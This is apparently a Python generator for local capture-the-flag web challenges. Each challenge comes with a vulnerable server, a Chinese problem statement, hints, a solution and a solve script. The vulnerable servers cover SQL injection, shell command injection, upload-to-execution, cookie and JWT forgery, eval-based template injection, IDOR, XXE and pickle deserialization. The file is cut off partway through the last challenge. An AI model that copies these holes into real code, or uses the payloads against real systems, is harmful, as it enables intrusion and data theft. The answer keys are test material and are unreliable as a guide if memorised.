from __future__ import annotations

from .helpers import *
from .models import BuildResult, Target

def web_statement(title_intro: str, steps: list[str]) -> str:
    return plain_statement(
        intro=title_intro,
        steps=steps,
        attachments=["app.py"],
        notes=["本题提供可本地启动的最小 Web 服务。", "本地测试可直接执行 `python3 app.py`。"],
        access=["默认端口由环境变量 `PORT` 控制，未设置时为 8080。"],
    )

def build_web_sqli(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import sqlite3
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs
        import os

        FLAG = "{flag}"
        DB = sqlite3.connect(":memory:", check_same_thread=False)
        DB.execute("create table users(username text, password text, role text)")
        DB.executemany("insert into users values(?,?,?)", [("admin","S3aled!","admin"),("guest","guest","user")])
        DB.commit()

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    body = "<form method='post' action='/login'><input name='username'><input name='password'><button>login</button></form>"
                    self._send(200, body, "text/html; charset=utf-8")
                else:
                    self._send(404, "not found")

            def do_POST(self):
                if self.path != "/login":
                    self._send(404, "not found")
                    return
                length = int(self.headers.get("Content-Length", "0"))
                form = parse_qs(self.rfile.read(length).decode("utf-8"))
                username = form.get("username", [""])[0]
                password = form.get("password", [""])[0]
                query = f"select role from users where username = '{{username}}' and password = '{{password}}'"
                row = DB.execute(query).fetchone()
                if row and row[0] == "admin":
                    self._send(200, FLAG)
                else:
                    self._send(403, "denied")

            def _send(self, status, body, ctype="text/plain; charset=utf-8"):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("这是一个最小登录页，认证逻辑直接把用户输入拼进了 SQL。", ["启动服务。", "构造认证绕过 payload。", "拿到返回的 flag。"])
    solution = """# 解法

登录查询是最经典的字符串拼接 SQL。`username=admin' -- ` 就能把后面的密码条件注释掉，直接以管理员身份登录并拿到 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    port = 18081
    proc = start(root / "attachments" / "app.py", port)
    try:
        data = urllib.parse.urlencode({"username": "admin' -- ", "password": "x"}).encode()
        body = urllib.request.urlopen(f"http://127.0.0.1:{port}/login", data=data).read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["直接看 SQL 拼接方式。", "注释掉密码条件即可。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_command_injection(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import os
        import subprocess
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"
        BASE = os.path.dirname(__file__)
        open(os.path.join(BASE, "flag.txt"), "w", encoding="utf-8").write(FLAG + "\\n")

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/":
                    self._send(200, "use /diag?host=127.0.0.1")
                    return
                if parsed.path == "/diag":
                    host = parse_qs(parsed.query).get("host", [""])[0]
                    output = subprocess.getoutput("echo checking " + host)
                    self._send(200, output)
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("诊断面板把用户输入直接拼进了 shell 命令。", ["启动服务。", "找到可控命令参数。", "注入命令读取 flag。"])
    solution = """# 解法

`/diag` 直接执行 `echo checking ` 加上用户输入，因此用 `; cat flag.txt` 就能把读取命令接进去。请求 `/diag?host=127.0.0.1;cat flag.txt` 即可。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18082)
    try:
        query = urllib.parse.quote("127.0.0.1;cat flag.txt")
        body = urllib.request.urlopen(f"http://127.0.0.1:18082/diag?host={query}").read().decode()
        for line in body.splitlines():
            if line.startswith("flag{"):
                print(line.strip())
                return
        raise SystemExit("flag not found")
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["看 shell 命令是怎么拼的。", "分号足够把第二条命令接进去。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_upload_double_ext(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import cgi
        import os
        import subprocess
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import unquote

        FLAG = "{flag}"
        BASE = os.path.dirname(__file__)
        UPLOADS = os.path.join(BASE, "uploads")
        os.makedirs(UPLOADS, exist_ok=True)
        open(os.path.join(BASE, "flag.txt"), "w", encoding="utf-8").write(FLAG + "\\n")

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    body = "<form method='post' action='/upload' enctype='multipart/form-data'><input type='file' name='file'><button>upload</button></form>"
                    self._send(200, body, "text/html; charset=utf-8")
                    return
                if self.path.startswith("/files/"):
                    name = unquote(self.path[len("/files/"):])
                    path = os.path.join(UPLOADS, name)
                    if not os.path.exists(path):
                        self._send(404, "missing")
                        return
                    if name.endswith(".py"):
                        out = subprocess.getoutput("python3 " + path)
                        self._send(200, out)
                    else:
                        self._send(200, open(path, "r", encoding="utf-8", errors="ignore").read())
                    return
                self._send(404, "not found")

            def do_POST(self):
                if self.path != "/upload":
                    self._send(404, "not found")
                    return
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={{
                        "REQUEST_METHOD": "POST",
                        "CONTENT_TYPE": self.headers["Content-Type"],
                        "CONTENT_LENGTH": self.headers.get("Content-Length", "0"),
                    }},
                )
                item = form["file"]
                name = os.path.basename(item.filename)
                first_ext = name.split(".")[1] if "." in name else ""
                if first_ext not in {{"jpg", "png"}}:
                    self._send(400, "bad ext")
                    return
                path = os.path.join(UPLOADS, name)
                with open(path, "wb") as f:
                    f.write(item.file.read())
                self._send(200, f"stored /files/{{name}}")

            def _send(self, status, body, ctype="text/plain; charset=utf-8"):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("上传点只检查了第一个扩展名，后续访问路径会把 `.py` 当脚本执行。", ["启动服务。", "上传带双扩展的脚本文件。", "访问执行结果并拿到 flag。"])
    solution = """# 解法

校验只看第一个扩展名，所以 `avatar.jpg.py` 会被当成图片放过；而访问 `/files/<name>` 时又按最终 `.py` 执行。上传脚本后再访问即可打印 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(80):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18083)
    try:
        boundary = "----ctfboundary"
        payload = (
            f"--{boundary}\\r\\n"
            "Content-Disposition: form-data; name=\\"file\\"; filename=\\"avatar.jpg.py\\"\\r\\n"
            "Content-Type: text/plain\\r\\n\\r\\n"
            "print(open('flag.txt').read())\\n"
            f"--{boundary}--\\r\\n"
        ).encode()
        req = urllib.request.Request(
            "http://127.0.0.1:18083/upload",
            data=payload,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        urllib.request.urlopen(req).read()
        body = urllib.request.urlopen("http://127.0.0.1:18083/files/avatar.jpg.py").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["想想服务端到底检查的是哪个扩展。", "访问阶段又是按什么逻辑处理文件。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_cookie_tamper(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import base64, json, os
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        FLAG = "{flag}"

        def encode(obj):
            return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode()

        def decode(value):
            return json.loads(base64.urlsafe_b64decode(value.encode()).decode())

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    cookie = self.headers.get("Cookie", "")
                    if "session=" not in cookie:
                        token = encode({{"user":"guest","role":"user"}})
                        self.send_response(200)
                        self.send_header("Set-Cookie", f"session={{token}}; Path=/")
                        self.end_headers()
                        self.wfile.write(b"guest page")
                        return
                    self._send(200, "guest page")
                    return
                if self.path == "/admin":
                    cookie = self.headers.get("Cookie", "")
                    token = cookie.split("session=", 1)[1].split(";", 1)[0]
                    session = decode(token)
                    if session.get("role") == "admin":
                        self._send(200, FLAG)
                    else:
                        self._send(403, "denied")
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("站点把权限状态直接放进了可篡改的 JSON Cookie。", ["启动服务。", "解码并修改 Cookie 里的角色字段。", "访问管理页拿到 flag。"])
    solution = """# 解法

Cookie 只是 Base64 包了一层 JSON，没有签名。把 `role` 改成 `admin` 后重新编码回去，请求 `/admin` 就会直接放行。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import base64, json, os, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18084)
    try:
        token = base64.urlsafe_b64encode(json.dumps({"user":"guest","role":"admin"}).encode()).decode()
        req = urllib.request.Request("http://127.0.0.1:18084/admin", headers={"Cookie": f"session={token}"})
        print(urllib.request.urlopen(req).read().decode().strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["先判断 Cookie 有没有签名。", "无签名 JSON 状态最容易直接改权限。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_jwt(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import base64, hashlib, hmac, json, os
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"
        SECRET = b"changeme123"

        def b64url(data):
            return base64.urlsafe_b64encode(data).rstrip(b"=")

        def sign(header, payload):
            body = b".".join([b64url(json.dumps(header).encode()), b64url(json.dumps(payload).encode())])
            sig = b64url(hmac.new(SECRET, body, hashlib.sha256).digest())
            return body.decode() + "." + sig.decode()

        def verify(token):
            body, sig = token.rsplit(".", 1)
            expected = b64url(hmac.new(SECRET, body.encode(), hashlib.sha256).digest()).decode()
            if not hmac.compare_digest(sig, expected):
                return None
            payload = json.loads(base64.urlsafe_b64decode(body.split(".")[1] + "==").decode())
            return payload

        GUEST = sign({{"alg":"HS256","typ":"JWT"}}, {{"user":"guest","role":"user"}})

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/token":
                    self._send(200, GUEST)
                    return
                if parsed.path == "/admin":
                    token = parse_qs(parsed.query).get("token", [""])[0]
                    payload = verify(token)
                    if payload and payload.get("role") == "admin":
                        self._send(200, FLAG)
                    else:
                        self._send(403, "denied")
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("站点使用 HS256 JWT，但签名密钥是弱口令。", ["启动服务。", "拿到一份普通用户 token。", "伪造管理员 token 并访问管理接口。"])
    solution = """# 解法

先拿 guest token 观察结构，再用弱密钥 `changeme123` 自己重签一份 `role=admin` 的 payload。带着它请求 `/admin` 就能拿到 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import base64, hashlib, hmac, json, os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18085)
    try:
        header = {"alg":"HS256","typ":"JWT"}
        payload = {"user":"admin","role":"admin"}
        body = ".".join([b64url(json.dumps(header).encode()), b64url(json.dumps(payload).encode())])
        sig = b64url(hmac.new(b"changeme123", body.encode(), hashlib.sha256).digest())
        token = body + "." + sig
        body = urllib.request.urlopen(f"http://127.0.0.1:18085/admin?token={urllib.parse.quote(token)}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["先拆一份现成 token 看结构。", "弱 HS256 secret 意味着你可以自己重签。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_ssti(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import os, re
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"

        def render(tpl: str) -> str:
            def repl(match):
                expr = match.group(1)
                return str(eval(expr, {{"__builtins__": {{}}}}, {{"flag": FLAG, "site": "ssti-lab"}}))
            return re.sub(r"\\x7b\\x7b(.*?)\\x7d\\x7d", repl, tpl)

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/":
                    self._send(200, "use /render?template=hello")
                    return
                if parsed.path == "/render":
                    tpl = parse_qs(parsed.query).get("template", [""])[0]
                    self._send(200, render(tpl))
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("渲染接口会直接求值 `{{ expr }}` 里的表达式。", ["启动服务。", "构造模板表达式读取服务端变量。", "拿到页面返回的 flag。"])
    solution = """# 解法

渲染器会对 `{{ ... }}` 中的内容做服务端求值，因此直接传 `{{flag}}` 就能把内存里的 flag 变量渲染出来。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18086)
    try:
        q = urllib.parse.quote("{{flag}}")
        body = urllib.request.urlopen(f"http://127.0.0.1:18086/render?template={q}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["看清模板占位语法。", "真正危险的是服务端求值。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_idor(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import json, os
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        EXPORTS = {{
            "1001": {{"owner": "alice", "body": "report one"}},
            "1002": {{"owner": "alice", "body": "report two"}},
            "9001": {{"owner": "admin", "body": "{flag}" }},
        }}

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/":
                    self._send(200, "your exports: 1001,1002")
                    return
                if parsed.path == "/export":
                    item = parse_qs(parsed.query).get("id", [""])[0]
                    record = EXPORTS.get(item)
                    if not record:
                        self._send(404, "missing")
                        return
                    self._send(200, json.dumps(record))
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("导出接口按对象编号直接取数据，没有做任何所有权校验。", ["启动服务。", "观察普通用户能看到的对象编号范围。", "改对象编号读取管理员导出并拿到 flag。"])
    solution = """# 解法

这是直接对象引用缺陷。普通页面只提示了 `1001/1002`，但接口不校验所有权，直接把 `id` 改成 `9001` 就能读到管理员导出里的 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18087)
    try:
        body = urllib.request.urlopen("http://127.0.0.1:18087/export?id=9001").read().decode()
        flag_start = body.index("flag{")
        flag_end = body.index("}", flag_start) + 1
        print(body[flag_start:flag_end])
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["这题关键不是爆破，而是对象编号替换。", "先判断接口有没有做所有权校验。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_xxe(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import os, re
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        FLAG = "{flag}"
        BASE = os.path.dirname(__file__)
        open(os.path.join(BASE, "flag.txt"), "w", encoding="utf-8").write(FLAG + "\\n")

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                if self.path != "/import":
                    self._send(404, "not found")
                    return
                length = int(self.headers.get("Content-Length", "0"))
                xml = self.rfile.read(length).decode("utf-8")
                entity = re.search(r'<!ENTITY\\s+(\\w+)\\s+SYSTEM\\s+"file://([^"]+)">', xml)
                if entity:
                    name, path = entity.groups()
                    if os.path.exists(path):
                        xml = xml.replace(f"&{{name}};", open(path, "r", encoding="utf-8").read())
                content = re.search(r"<data>(.*?)</data>", xml, re.S)
                self._send(200, content.group(1) if content else "empty")

            def do_GET(self):
                if self.path == "/":
                    self._send(200, "post xml to /import")
                else:
                    self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("导入接口会解析自定义外部实体，并把实体内容直接塞回 XML。", ["启动服务。", "构造带外部实体的 XML。", "读取本地 flag 文件并提交。"])
    solution = """# 解法

接口会识别 `<!ENTITY x SYSTEM "file://...">` 并把 `&x;` 替换成本地文件内容，因此构造一个指向 `flag.txt` 的实体即可读到 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18088)
    try:
        xml = '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file://flag.txt">]><data>&x;</data>'.encode()
        req = urllib.request.Request("http://127.0.0.1:18088/import", data=xml, method="POST")
        body = urllib.request.urlopen(req).read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["关键在 DOCTYPE 里的实体声明。", "实体引用最终会出现在 `<data>` 里。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_pickle(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import base64, os, pickle
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"
        BASE = os.path.dirname(__file__)
        open(os.path.join(BASE, "flag.txt"), "w", encoding="utf-8").write(FLAG + "\\n")

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/":
                    self._send(200, "use /restore?blob=...")
                    return
                if parsed.path == "/restore":
                    blob = parse_qs(parsed.query).get("blob", [""])[0]
                    obj = pickle.loads(base64.urlsafe_b64decode(blob.encode()))
                    self._send(200, str(obj))
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("恢复接口直接对用户给的 blob 做 `pickle.loads`。", ["启动服务。", "构造恶意 pickle 对象。", "让服务端反序列化后把 flag 读出来。"])
    solution = """# 解法

利用 `__reduce__` 把对象还原过程改成 `eval('open(\"flag.txt\").read()')`。服务端 `pickle.loads` 后会返回文件内容，页面直接把它打印出来。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import base64, os, pickle, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


class Evil:
    def __reduce__(self):
        return (eval, ('open("flag.txt").read()',))


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18089)
    try:
        blob = base64.urlsafe_b64encode(pickle.dumps(Evil())).decode()
        body = urllib.request.urlopen(f"http://127.0.0.1:18089/restore?blob={urllib.parse.quote(blob)}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["`pickle.loads` 本身就是危险入口。", "想想 `__reduce__` 能把还原动作改成什么。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_workflow(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import os
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path == "/":
                    self._send(200, "step1 at /step1")
                    return
                if parsed.path == "/step1":
                    self._send(200, "submit ticket=ready to /step2")
                    return
                if parsed.path == "/step2":
                    self._send(200, "final page is /final?ok=1")
                    return
                if parsed.path == "/final":
                    ok = parse_qs(parsed.query).get("ok", ["0"])[0]
                    if ok == "1":
                        self._send(200, FLAG)
                    else:
                        self._send(403, "denied")
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("多步骤流程的最终页只看一个可控查询参数，没有真正绑定前置状态。", ["启动服务。", "观察最终页的保护条件。", "绕过前置步骤直接访问 flag。"])
    solution = """# 解法

最终页根本不校验前面步骤，只要参数 `ok=1` 就会放行。因此直接访问 `/final?ok=1` 即可拿到 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
